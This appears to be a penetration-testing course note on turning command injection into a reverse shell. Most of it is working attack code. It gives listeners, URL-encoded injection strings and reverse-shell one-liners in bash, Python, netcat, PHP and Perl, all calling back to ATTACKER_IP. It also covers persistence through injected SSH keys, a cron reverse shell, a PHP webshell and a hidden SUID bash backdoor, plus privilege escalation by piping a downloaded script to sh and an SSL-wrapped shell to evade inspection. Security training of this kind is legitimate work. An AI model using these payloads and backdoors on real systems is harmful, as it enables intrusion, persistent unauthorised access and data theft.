---
tags: [vapt, command-injection, advanced]
difficulty: advanced
module: "08 - Command Injection"
topic: "08.10 Command Injection to Reverse Shell"
---

# 08.10 — Command Injection to Reverse Shell

## What is a Reverse Shell?

A reverse shell makes the TARGET server connect BACK to the attacker, giving the attacker interactive shell access. This is the opposite of a bind shell (where attacker connects to the target).

```
NORMAL (BIND SHELL):                REVERSE SHELL:
  Attacker → connects to port       Target → connects to attacker
  on target                         Attacker receives connection
  (Firewall usually blocks this!)   (Outbound traffic usually allowed!)

WHY REVERSE SHELL:
  - Corporate firewalls block INBOUND connections to servers
  - But outbound HTTP/HTTPS/DNS is usually allowed
  - Reverse shell uses outbound TCP connection → bypasses firewall!
```

---

## Step 1: Set Up Listener (Attacker's Machine)

```bash
# NETCAT LISTENER (most basic):
nc -lvnp 4444
# -l = listen mode
# -v = verbose
# -n = no DNS lookup
# -p 4444 = port 4444

# RECOMMENDED: USE RLWRAP FOR BETTER SHELL (arrow keys, history):
rlwrap nc -lvnp 4444

# METASPLOIT LISTENER (for meterpreter shells):
msfconsole
use exploit/multi/handler
set payload linux/x86/shell_reverse_tcp
set LHOST YOUR_IP
set LPORT 4444
run

# WHAT PORT TO USE?
# 443  → Looks like HTTPS (firewall-friendly)
# 80   → Looks like HTTP (firewall-friendly)
# 53   → Looks like DNS (almost never blocked!)
# 4444 → Common pentest port
# 1337 → Fun port
```

---

## Step 2: Get Your Attacker IP

```bash
# YOUR PUBLIC IP:
curl ifconfig.me
curl ipecho.net/plain
curl icanhazip.com

# YOUR LOCAL IP (if testing on internal network):
ip a
ifconfig

# NGROK (if behind NAT):
ngrok tcp 4444
# Gives you: tcp://0.tcp.ngrok.io:PORT → use this as ATTACKER_IP:PORT
```

---

## Step 3: Inject Reverse Shell Payload

### Bash Reverse Shell (Most Common on Linux)

```bash
# CLASSIC:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# URL-ENCODED FOR INJECTION:
bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261

# VIA FILE READ:
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# INJECTION FORMAT:
?host=127.0.0.1;bash+-i+>&+/dev/tcp/ATTACKER_IP/4444+0>&1
?host=127.0.0.1;bash -c 'exec bash -i &>/dev/tcp/ATTACKER_IP/4444 <&1'

# /dev/tcp IS A BASH BUILT-IN:
# Not a real file — bash handles it internally!
# Opens TCP connection to ATTACKER_IP:4444
# >& = redirect stdout AND stderr
# 0>&1 = redirect stdin to stdout (so shell input comes from connection)
```

### Python Reverse Shell

```python
# PYTHON 3:
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# PYTHON 2:
python -c "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

# SHORTER PYTHON:
python3 -c "import pty,socket,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('bash')"
```

### Netcat Reverse Shell

```bash
# NC WITH -e FLAG (traditional):
nc -e /bin/sh ATTACKER_IP 4444
nc -e /bin/bash ATTACKER_IP 4444

# NC WITHOUT -e (OPENBSD VERSION — common on Ubuntu):
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
# Explanation: named pipe (mkfifo) creates bidirectional communication

# NCAT (netcat from nmap):
ncat ATTACKER_IP 4444 -e /bin/bash
```

### PHP Reverse Shell

```php
// ONE-LINER:
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

// FOR WEBSHELLS:
// Create shell.php on target, then trigger it:
<?php
$sock = fsockopen("ATTACKER_IP", 4444);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>

// PENTEST MONKEY PHP SHELL (comprehensive):
// https://github.com/pentestmonkey/php-reverse-shell
// Change $ip and $port in the script
```

### Perl Reverse Shell

```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

---

## Step 4: Upgrade the Shell (TTY)

When you first get a shell, it's usually limited (no tab completion, can't use `sudo`, `vi`, `nano`). Upgrade it:

```bash
# METHOD 1 — PYTHON PTY (most common):
python3 -c "import pty; pty.spawn('/bin/bash')"

# METHOD 2 — SCRIPT:
script /dev/null -c bash

# METHOD 3 — SOCAT:
# On attacker (listener):
socat file:`tty`,raw,echo=0 tcp-listen:4444

# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

# AFTER PYTHON PTY:
# 1. Ctrl+Z (background the shell)
# 2. stty raw -echo; fg
# 3. reset → reset the terminal (may need to type blind)
# 4. export TERM=xterm
# 5. export SHELL=bash
# 6. stty rows 50 cols 200  (match your terminal size)

# NOW YOU HAVE A FULLY INTERACTIVE SHELL!
```

---

## Step 5: Establish Persistence

```bash
# ADD SSH KEY (if .ssh exists):
mkdir -p /home/www-data/.ssh
echo "YOUR_PUBLIC_KEY" >> /home/www-data/.ssh/authorized_keys
chmod 600 /home/www-data/.ssh/authorized_keys
# Then SSH in: ssh www-data@target.com -i your_private_key

# CRON JOB PERSISTENCE:
echo "* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /var/spool/cron/www-data
# → Every minute: reverse shell connects back!

# WEBSHELL (already wrote earlier):
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# SUID BASH (if root):
cp /bin/bash /tmp/.backdoor
chmod +s /tmp/.backdoor
# Later: /tmp/.backdoor -p → root shell!
```

---

## Upgrading Privileges (Post-Shell)

```bash
# CHECK FOR SUDO:
sudo -l

# CHECK SUID FILES:
find / -perm -4000 -type f 2>/dev/null

# CHECK FOR WRITABLE SCRIPTS RUN BY CRON:
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# LINPEAS (automated privilege escalation):
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Downloads and runs LinPEAS → finds privilege escalation vectors automatically!

# DOWNLOAD AND TRANSFER:
# On attacker: python3 -m http.server 8080
# On target: wget http://ATTACKER_IP:8080/linpeas.sh && bash linpeas.sh
```

---

## Firewall Evasion

```bash
# IF PORT 4444 IS BLOCKED — USE COMMON PORTS:
nc -lvnp 443    ← HTTPS port (almost never blocked)
nc -lvnp 80     ← HTTP port
nc -lvnp 53     ← DNS port (almost always open)
nc -lvnp 8080   ← alt HTTP

# SSL-WRAPPED SHELL (to bypass SSL inspection):
# Server side (attacker):
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=evil"
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# Client side (target - inject this):
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s
```

---

## Related Notes
- [[11 - Reverse Shell Payloads]] — comprehensive payload list
- [[02 - OS Command Injection Linux]] — getting the initial injection
- [[04 - Blind Command Injection]] — blind injection to reverse shell
- [[Module 02 - Tools]] — Metasploit, netcat
